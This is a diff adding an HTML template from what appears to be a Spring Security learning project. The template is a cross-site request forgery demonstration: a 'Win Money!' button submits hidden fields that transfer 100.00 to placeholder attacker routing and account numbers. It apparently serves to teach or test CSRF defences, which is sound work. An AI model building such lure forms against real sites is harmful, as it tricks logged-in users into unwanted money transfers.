@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml"
+      xmlns:th="http://www.thymeleaf.org"
+      xmlns:sec="http://www.thymeleaf.org/thymeleaf-extras-springsecurity3">
+<head>
+    <title>Spring Security Learn </title>
+</head>
+<body>
+<div>
+    <form action="/user1" method="post">
+        <div>${_csrf}</div>
+        <input type="hidden"
+               name="amount"
+               value="100.00"/>
+        <input type="hidden"
+               name="routingNumber"
+               value="evilsRoutingNumber"/>
+        <input type="hidden"
+               name="account"
+               value="evilsAccountNumber"/>
+        <input type="submit"
+               value="Win Money!"/>
+    </form>
+</div>
+</body>
+</html>
